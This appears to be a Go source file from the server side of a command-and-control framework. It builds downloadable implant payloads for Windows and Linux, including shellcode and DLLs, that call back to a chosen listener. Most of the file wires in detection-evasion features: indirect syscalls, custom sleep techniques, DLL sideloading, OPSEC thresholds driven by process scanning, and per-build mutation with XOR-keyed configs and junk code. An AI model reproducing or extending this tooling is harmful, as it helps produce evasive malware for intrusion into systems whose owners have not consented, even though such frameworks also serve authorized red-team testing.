package payload

import (
	"crypto/rand"
	"crypto/sha256"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	"github.com/google/uuid"
)

// NewPayloadHandler creates a new payload handler
//
// Pre-conditions:
//   - payloadsDir is a valid directory path with write permissions
//   - agentSourceDir points to a valid agent source code directory
//
// Post-conditions:
//   - Returns an initialized PayloadHandler
//   - Directory structure for payloads is created if it doesn't exist
//   - Tracking map for generated payloads is initialized
func NewPayloadHandler(payloadsDir, agentSourceDir string) *PayloadHandler {
	// Ensure directories exist
	for _, dir := range []string{payloadsDir, filepath.Join(payloadsDir, "debug"), filepath.Join(payloadsDir, "release")} {
		if err := os.MkdirAll(dir, 0755); err != nil {
			log.Printf("[ERROR] Failed to create directory %s: %v", dir, err)
		}
	}

	return &PayloadHandler{
		payloadsDir:    payloadsDir,
		agentSourceDir: agentSourceDir,
		payloads:       make(map[string]PayloadResult),
	}
}

// resolveMutationSeed returns the caller-supplied seed or generates a random
// one. The second return value reports whether the seed was server-generated.
func resolveMutationSeed(supplied string) (string, bool, error) {
	if supplied != "" {
		trimmed := strings.TrimPrefix(strings.ToLower(strings.TrimSpace(supplied)), "0x")
		seed, err := strconv.ParseUint(trimmed, 16, 64)
		if err != nil {
			return "", false, fmt.Errorf("invalid mutation seed %q: expected hex u64", supplied)
		}
		return fmt.Sprintf("%016x", seed), false, nil
	}
	var b [8]byte
	if _, err := rand.Read(b[:]); err != nil {
		return "", false, fmt.Errorf("failed to generate mutation seed: %w", err)
	}
	return fmt.Sprintf("%016x", binary.BigEndian.Uint64(b[:])), true, nil
}

// gitRevision returns the current git revision of dir, or "unknown".
func gitRevision(dir string) string {
	out, err := exec.Command("git", "-C", dir, "rev-parse", "HEAD").Output()
	if err != nil {
		return "unknown"
	}
	return strings.TrimSpace(string(out))
}

// writeProvenance records the build inputs needed to reproduce a payload next
// to the built artifact (issue #99).
func writeProvenance(artifactDir string, provenance map[string]interface{}) error {
	data, err := json.MarshalIndent(provenance, "", "  ")
	if err != nil {
		return fmt.Errorf("failed to marshal provenance: %w", err)
	}
	path := filepath.Join(artifactDir, "provenance.json")
	if err := os.WriteFile(path, data, 0644); err != nil {
		return fmt.Errorf("failed to write provenance: %w", err)
	}
	log.Printf("[INFO] Wrote build provenance to %s", path)
	return nil
}

// HandleGeneratePayload processes a request to generate a payload
//
// Pre-conditions:
//   - HTTP request contains a valid JSON payload configuration
//   - Request method is POST
//
// Post-conditions:
//   - Payload is generated according to the provided configuration
//   - Response contains the generated payload details or an error
//   - Generated payload is stored and tracked for later retrieval
func (h *PayloadHandler) HandleGeneratePayload(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var config PayloadConfig
	if err := json.NewDecoder(r.Body).Decode(&config); err != nil {
		http.Error(w, "Invalid request body", http.StatusBadRequest)
		return
	}

	// Enforce listener selection
	if config.ListenerID == "" {
		http.Error(w, "Listener selection is required. You must select a listener for agent communication.", http.StatusBadRequest)
		log.Printf("[ERROR] Payload generation aborted: no listener selected.")
		return
	}

	// Generate payload
	result, err := h.GeneratePayload(config)
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}

	// Store result for later retrieval
	h.mutex.Lock()
	h.payloads[result.ID] = result
	h.mutex.Unlock()

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(result)
}

// HandleDownloadPayload serves a generated payload for download
//
// Pre-conditions:
//   - Request contains a valid payload ID in the URL path
//   - Payload with the specified ID exists in the handler's registry
//
// Post-conditions:
//   - Payload file is streamed to the client for download
//   - Appropriate headers for file download are set
//   - Error response is sent if the payload is not found
func (h *PayloadHandler) HandleDownloadPayload(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	// Extract payload ID from URL path
	id := strings.TrimPrefix(r.URL.Path, "/api/payload/download/")
	if id == "" {
		http.Error(w, "Payload ID is required", http.StatusBadRequest)
		return
	}

	// Look up payload result
	h.mutex.Lock()
	result, exists := h.payloads[id]
	h.mutex.Unlock()

	if !exists {
		http.Error(w, "Payload not found", http.StatusNotFound)
		return
	}

	// Open file
	file, err := os.Open(result.Path)
	if err != nil {
		http.Error(w, "Failed to read payload file", http.StatusInternalServerError)
		log.Printf("[ERROR] Failed to open payload file %s: %v", result.Path, err)
		return
	}
	defer file.Close()

	// Set appropriate headers
	w.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=\"%s\"", result.Filename))
	w.Header().Set("Content-Type", "application/octet-stream")
	w.Header().Set("Content-Length", fmt.Sprintf("%d", result.Size))

	// Stream file to response
	if _, err := io.Copy(w, file); err != nil {
		log.Printf("[ERROR] Failed to stream payload file %s: %v", result.Path, err)
	}
}

// GeneratePayload creates a payload based on the provided configuration
//
// Pre-conditions:
//   - config contains valid payload generation parameters
//   - Listener specified in config exists and is accessible
//   - Agent source code is available and can be built
//
// Post-conditions:
//   - Agent payload is built and stored in the payloads directory
//   - Returns PayloadResult with details about the generated payload
//   - Returns error if payload generation fails at any step
func (h *PayloadHandler) GeneratePayload(config PayloadConfig) (PayloadResult, error) {
	log.Printf("[INFO] Generating payload with config: %+v", config)

	// Get listener details
	listener, err := h.loadListenerConfig(config.ListenerID)
	if err != nil {
		log.Printf("[ERROR] Failed to get listener %s: %v", config.ListenerID, err)
		return PayloadResult{}, fmt.Errorf("failed to get listener: %w", err)
	}
	if listener.Port == 8080 {
		log.Printf("[WARNING] Listener port is 8080 (web server port). This is not recommended for agent communication.")
	}
	log.Printf("[INFO] Using listener: %s (%s) at %s:%d", listener.Name, listener.Protocol, listener.BindHost, listener.Port)

	payloadID := uuid.NewString()
	log.Printf("[INFO] Generated payload build ID %s for listener %s", payloadID, listener.ID)

	// Resolve the mutation seed: use the caller-supplied one for reproduction
	// builds, otherwise generate a random seed per payload (issue #67).
	mutationSeed, seedGenerated, err := resolveMutationSeed(config.MutationSeed)
	if err != nil {
		log.Printf("[ERROR] Failed to resolve mutation seed: %v", err)
		return PayloadResult{}, err
	}
	log.Printf("[INFO] Using mutation seed %s (server-generated: %t)", mutationSeed, seedGenerated)

	// Determine build type (debug or release)
	buildType := "release"
	if config.AgentType == "debugAgent" {
		buildType = "debug"
	}
	log.Printf("[INFO] Build type: %s", buildType)

	// Create a directory for build artifacts
	outputDir := filepath.Join(h.payloadsDir, buildType, payloadID)
	if err := os.MkdirAll(outputDir, 0755); err != nil {
		log.Printf("[ERROR] Failed to create output directory %s: %v", outputDir, err)
		return PayloadResult{}, fmt.Errorf("failed to create output directory: %w", err)
	}
	log.Printf("[INFO] Created output directory: %s", outputDir)

	// Create agent config file
	configPath := filepath.Join(outputDir, "config.json")

	// Determine the protocol prefix
	protocolPrefix := "http://"
	if listener.Protocol == "https" {
		protocolPrefix = "https://"
	}

	// Choose the advertised host: prefer Hosts[0] if set, else BindHost
	var connectHost string
	if len(listener.Hosts) > 0 {
		connectHost = listener.Hosts[0]
	} else {
		connectHost = listener.BindHost
	}
	serverUrl := fmt.Sprintf("%s%s:%d", protocolPrefix, connectHost, listener.Port)

	agentConfig := map[string]interface{}{
		"server_url":     serverUrl,
		"sleep_interval": config.Sleep,
		"jitter":         2, // Default jitter value
		"payload_id":     payloadID,
		"agent_id":       "",
		"listener_id":    listener.ID,
		"protocol":       listener.Protocol,
	}

	// Include SOCKS5 proxy settings if requested
	agentConfig["socks5_enabled"] = config.Socks5Enabled
	agentConfig["socks5_host"] = config.Socks5Host
	agentConfig["socks5_port"] = config.Socks5Port
	if config.Socks5Enabled {
		agentConfig["protocol"] = "socks5"
	}

	// Add additional configuration options based on payload settings
	if config.IndirectSyscall {
		log.Printf("[INFO] Enabling indirect syscalls")
		agentConfig["indirect_syscalls"] = true
	}

	if config.SleepTechnique != "" && config.SleepTechnique != "standard" {
		log.Printf("[INFO] Using custom sleep technique: %s", config.SleepTechnique)
		agentConfig["sleep_technique"] = config.SleepTechnique
	}

	if config.DllSideloading {
		log.Printf("[INFO] Enabling DLL sideloading with DLL: %s, Export: %s",
			config.SideloadDll, config.ExportName)
		agentConfig["dll_sideloading"] = true
		agentConfig["sideload_dll"] = config.SideloadDll
		agentConfig["export_name"] = config.ExportName
	}

	// Add OPSEC configurations to agentConfig map
	agentConfig["proc_scan_interval_secs"] = config.ProcScanIntervalSecs
	agentConfig["base_score_threshold_reduced_to_full"] = config.BaseThresholdEnterFullOpsec     // Map from HTML name
	agentConfig["base_score_threshold_bg_to_reduced"] = config.BaseThresholdEnterReducedActivity // Map from HTML name
	agentConfig["min_duration_full_opsec_secs"] = config.MinDurationFullOpsecSecs
	agentConfig["min_duration_reduced_activity_secs"] = config.MinDurationReducedActivitySecs
	agentConfig["min_duration_background_opsec_secs"] = config.MinDurationBackgroundOpsecSecs
	agentConfig["reduced_activity_sleep_secs"] = config.ReducedActivitySleepSecs
	agentConfig["base_max_consecutive_c2_failures"] = config.BaseMaxConsecutiveC2Failures
	agentConfig["c2_failure_threshold_increase_factor"] = config.C2FailureThresholdIncreaseFactor
	agentConfig["c2_failure_threshold_decrease_factor"] = config.C2FailureThresholdDecreaseFactor
	agentConfig["c2_threshold_adjust_interval_secs"] = config.C2ThresholdAdjustIntervalSecs
	agentConfig["c2_dynamic_threshold_max_multiplier"] = config.C2DynamicThresholdMaxMultiplier

	configJSON, err := json.MarshalIndent(agentConfig, "", "  ")
	if err != nil {
		log.Printf("[ERROR] Failed to marshal agent config: %v", err)
		return PayloadResult{}, fmt.Errorf("failed to marshal agent config: %w", err)
	}

	if err := os.WriteFile(configPath, configJSON, 0644); err != nil {
		log.Printf("[ERROR] Failed to write agent config to %s: %v", configPath, err)
		return PayloadResult{}, fmt.Errorf("failed to write agent config: %w", err)
	}
	log.Printf("[INFO] Created agent config file: %s", configPath)

	// Determine build target
	var buildTarget string
	switch {
	case config.Format == "windows_exe" || config.Format == "windows_dll" || config.Format == "windows_service":
		buildTarget = "x86_64-pc-windows-gnu"
	case config.Format == "linux_elf":
		buildTarget = "x86_64-unknown-linux-gnu"
	case config.Architecture == "arm64":
		buildTarget = "aarch64-unknown-linux-gnu"
	default:
		buildTarget = "x86_64-unknown-linux-gnu" // Default to Linux x64
	}
	log.Printf("[INFO] Using build target: %s", buildTarget)

	// Get the path to the build script
	buildScript := filepath.Join(h.agentSourceDir, "build.sh")
	if _, err := os.Stat(buildScript); os.IsNotExist(err) {
		log.Printf("[ERROR] Build script not found at %s", buildScript)
		return PayloadResult{}, fmt.Errorf("build script not found at %s", buildScript)
	}
	log.Printf("[INFO] Using build script: %s", buildScript)

	// Set up the command
	cmdArgs := []string{
		buildScript,
		"--target", buildTarget,
		"--output", outputDir,
		"--build-type", buildType,
		"--format", config.Format,
		"--payload-id", payloadID,
		"--listener-host", connectHost, // Use advertised host for build args
		"--listener-port", fmt.Sprintf("%d", listener.Port),
		"--protocol", listener.Protocol,
	}

	// Add additional build arguments based on configuration
	if config.IndirectSyscall {
		cmdArgs = append(cmdArgs, "--indirect-syscalls")
	}

	if config.SleepTechnique != "" && config.SleepTechnique != "standard" {
		cmdArgs = append(cmdArgs, "--sleep-technique", config.SleepTechnique)
	}

	if config.DllSideloading {
		cmdArgs = append(cmdArgs, "--dll-sideload")
		if config.SideloadDll != "" {
			cmdArgs = append(cmdArgs, "--sideload-dll", config.SideloadDll)
		}
		if config.ExportName != "" {
			cmdArgs = append(cmdArgs, "--export-name", config.ExportName)
		}
	}

	log.Printf("[INFO] Command: /bin/bash %s", strings.Join(cmdArgs, " "))
	cmd := exec.Command("/bin/bash", cmdArgs...)

	// Set working directory to agent source directory
	cmd.Dir = h.agentSourceDir
	log.Printf("[INFO] Working directory: %s", h.agentSourceDir)

	// Add environment variables
	cmd.Env = append(os.Environ(),
		fmt.Sprintf("TARGET=%s", buildTarget),
		fmt.Sprintf("OUTPUT_DIR=%s", outputDir),
		fmt.Sprintf("BUILD_TYPE=%s", buildType),
		fmt.Sprintf("PROTOCOL=%s", listener.Protocol),
		fmt.Sprintf("LISTENER_HOST=%s", connectHost),
		fmt.Sprintf("LISTENER_PORT=%d", listener.Port),
		fmt.Sprintf("LISTENER_ID=%s", listener.ID),
		fmt.Sprintf("SLEEP_INTERVAL=%d", config.Sleep),
		fmt.Sprintf("SOCKS5_ENABLED=%t", config.Socks5Enabled),
		fmt.Sprintf("SOCKS5_HOST=%s", config.Socks5Host),
		fmt.Sprintf("SOCKS5_PORT=%d", config.Socks5Port),
		fmt.Sprintf("MUTATION_SEED=%s", mutationSeed),

		// Add OPSEC ENV VARS
		fmt.Sprintf("PROC_SCAN_INTERVAL_SECS=%d", config.ProcScanIntervalSecs),
		fmt.Sprintf("BASE_SCORE_THRESHOLD_REDUCED_TO_FULL=%.1f", config.BaseThresholdEnterFullOpsec),
		fmt.Sprintf("BASE_SCORE_THRESHOLD_BG_TO_REDUCED=%.1f", config.BaseThresholdEnterReducedActivity),
		fmt.Sprintf("MIN_FULL_OPSEC_SECS=%d", config.MinDurationFullOpsecSecs),
		fmt.Sprintf("MIN_REDUCED_OPSEC_SECS=%d", config.MinDurationReducedActivitySecs),
		fmt.Sprintf("MIN_BG_OPSEC_SECS=%d", config.MinDurationBackgroundOpsecSecs),
		fmt.Sprintf("REDUCED_ACTIVITY_SLEEP_SECS=%d", config.ReducedActivitySleepSecs),
		fmt.Sprintf("BASE_MAX_C2_FAILS=%d", config.BaseMaxConsecutiveC2Failures),
		fmt.Sprintf("C2_THRESH_INC_FACTOR=%.2f", config.C2FailureThresholdIncreaseFactor),
		fmt.Sprintf("C2_THRESH_DEC_FACTOR=%.2f", config.C2FailureThresholdDecreaseFactor),
		fmt.Sprintf("C2_THRESH_ADJ_INTERVAL=%d", config.C2ThresholdAdjustIntervalSecs),
		fmt.Sprintf("C2_THRESH_MAX_MULT=%.1f", config.C2DynamicThresholdMaxMultiplier),
	)

	log.Printf("[INFO] Environment variables set: TARGET=%s, OUTPUT_DIR=%s, BUILD_TYPE=%s, SLEEP_INTERVAL=%d, SOCKS5_ENABLED=%t, SOCKS5_PORT=%d",
		buildTarget, outputDir, buildType, config.Sleep, config.Socks5Enabled, config.Socks5Port)

	log.Printf("[INFO] Starting build process...")
	// Execute build command
	output, err := cmd.CombinedOutput()
	if err != nil {
		log.Printf("[ERROR] Build command failed: %v\nOutput: %s", err, output)

		// Log each line of the output separately for better visibility in logs
		outputLines := strings.Split(string(output), "\n")
		for _, line := range outputLines {
			if line != "" {
				log.Printf("[ERROR] Build output: %s", line)
			}
		}

		return PayloadResult{}, fmt.Errorf("build failed: %v - %s", err, output)
	}

	// Log the first few lines of the output and summarize the rest
	outputLines := strings.Split(string(output), "\n")
	// Log ALL lines, not just the first 10
	for _, line := range outputLines {
		if line != "" {
			log.Printf("[INFO] Build output: %s", line)
		}
	}

	// Determine payload filename
	var payloadFileName string
	switch {
	case config.Format == "windows_exe":
		payloadFileName = "agent.exe"
	case config.Format == "windows_dll":
		payloadFileName = "agent.dll"
	case config.Format == "windows_service":
		payloadFileName = "agent_service.exe"
	case config.Format == "windows_shellcode":
		payloadFileName = "shellcode.bin"
	default:
		payloadFileName = "agent"
	}
	log.Printf("[INFO] Payload filename: %s", payloadFileName)

	// Find the generated payload
	payloadPath := filepath.Join(outputDir, payloadFileName)
	log.Printf("[INFO] Checking for payload at: %s", payloadPath)

	// Check if file exists
	fileInfo, err := os.Stat(payloadPath)
	if err != nil {
		log.Printf("[ERROR] Payload not found at expected location %s: %v", payloadPath, err)
		// Check alternative location (the one the build script uses)
		alternativePayloadPath := filepath.Join(h.agentSourceDir, "static", "payloads", buildType, payloadID, payloadFileName)
		log.Printf("[INFO] Checking alternative location: %s", alternativePayloadPath)

		alternativeFileInfo, alternativeErr := os.Stat(alternativePayloadPath)
		if alternativeErr == nil {
			// Found it in the alternative location, update the path
			log.Printf("[INFO] Found payload at alternative location: %s", alternativePayloadPath)
			payloadPath = alternativePayloadPath
			fileInfo = alternativeFileInfo
		} else {
			// Still not found, look in any subdirectory of the output directory
			log.Printf("[INFO] Searching for payload in output directory and subdirectories...")
			var foundPath string
			var foundInfo os.FileInfo

			// Walk through the output directory to find the payload file
			err := filepath.Walk(outputDir, func(path string, info os.FileInfo, err error) error {
				if err != nil {
					return err
				}
				if !info.IsDir() && (info.Name() == payloadFileName || strings.HasSuffix(info.Name(), payloadFileName)) {
					foundPath = path
					foundInfo = info
					return filepath.SkipAll // Stop the walk
				}
				return nil
			})

			if err == nil && foundPath != "" {
				log.Printf("[INFO] Found payload during directory search: %s", foundPath)
				payloadPath = foundPath
				fileInfo = foundInfo
			} else {
				// List directory contents to aid debugging
				files, err := os.ReadDir(outputDir)
				if err != nil {
					log.Printf("[ERROR] Failed to read output directory: %v", err)
				} else {
					log.Printf("[INFO] Output directory %s contents:", outputDir)
					for _, file := range files {
						log.Printf("[INFO] - %s", file.Name())
					}
				}
				return PayloadResult{}, fmt.Errorf("payload not found at expected location: %w", err)
			}
		}
	}

	// Persist build provenance next to the artifact so any payload is
	// reproducible from (git revision, seed) (issue #99).
	provenance := map[string]interface{}{
		"mutation_seed":            mutationSeed,
		"seed_generated_by_server": seedGenerated,
		"git_revision":             gitRevision(h.agentSourceDir),
		"target":                   buildTarget,
		"built_at":                 time.Now().UTC().Format(time.RFC3339),
		"config_sha256":            fmt.Sprintf("%x", sha256.Sum256(configJSON)),
		"mutation_flags":           []string{"config-xor-key", "junk-code", "surface-strings"},
	}
	if err := writeProvenance(filepath.Dir(payloadPath), provenance); err != nil {
		log.Printf("[WARNING] Failed to write build provenance: %v", err)
	}

	// Create the result
	result := PayloadResult{
		ID:           payloadID,
		PayloadID:    payloadID,
		ListenerID:   listener.ID,
		MutationSeed: mutationSeed,
		Filename:     payloadFileName,
		Path:         payloadPath,
		Size:         fileInfo.Size(),
		Created:      time.Now().Format(time.RFC3339),
	}

	log.Printf("[INFO] Successfully generated payload: %s (%s, %d bytes)",
		result.Filename, buildType, result.Size)

	return result, nil
}

// loadListenerConfig loads a listener's configuration from its JSON file
func (h *PayloadHandler) loadListenerConfig(listenerID string) (ListenerConfig, error) {
	// Search through all listener directories to find one with a config matching our ID
	entries, err := os.ReadDir(filepath.Join("static", "listeners"))
	if err != nil {
		return ListenerConfig{}, fmt.Errorf("failed to read listeners directory: %w", err)
	}

	// Look through each listener directory (named by listener name)
	for _, entry := range entries {
		if !entry.IsDir() {
			continue
		}

		configPath := filepath.Join("static", "listeners", entry.Name(), "config.json")
		configData, err := os.ReadFile(configPath)
		if err != nil {
			log.Printf("[INFO] Skipping directory %s: %v", entry.Name(), err)
			continue
		}

		// Try to parse the config
		var config ListenerConfig
		if err := json.Unmarshal(configData, &config); err != nil {
			log.Printf("[WARNING] Failed to parse config in %s: %v", entry.Name(), err)
			continue
		}

		// Verify this config has the ID we're looking for
		if config.ID == listenerID {
			log.Printf("[INFO] Found matching listener config in directory %s with ID %s", entry.Name(), listenerID)
			return config, nil
		}
	}

	return ListenerConfig{}, fmt.Errorf("no listener found with ID %s", listenerID)
}

// RegisterRoutes registers all payload-related routes on the provided mux.
//
// Pre-conditions:
//   - HTTP server is initialized and ready to accept route registrations
//
// Post-conditions:
//   - Routes for payload generation and download are registered
//   - Requests to these routes will be handled by the appropriate methods
func (h *PayloadHandler) RegisterRoutes(mux *http.ServeMux) {
	mux.HandleFunc("/api/payload/generate", h.HandleGeneratePayload)
	mux.HandleFunc("/api/payload/download/", h.HandleDownloadPayload)
}

// SetupRoutes registers payload routes on the default mux for legacy callers.
func (h *PayloadHandler) SetupRoutes() {
	h.RegisterRoutes(http.DefaultServeMux)
}
